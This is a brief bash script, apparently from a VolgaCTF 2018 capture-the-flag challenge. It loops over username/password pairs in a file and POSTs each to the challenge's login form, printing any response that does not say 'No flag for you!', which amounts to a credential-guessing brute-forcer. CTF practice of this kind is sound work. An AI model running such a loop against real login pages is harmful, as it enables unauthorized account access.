#!/bin/bash

while read l ; do u=`echo $l | cut -d' ' -f 1`; p=`echo $l | cut -d' ' -f 2`; echo -n $u && echo -n  "  " && curl -X POST -d uname=$u -d psw=$p http://master.quals.2018.volgactf.ru:3333/ 2>/dev/null | grep -v "No flag for you!" ; echo ;done < try-admin.txt
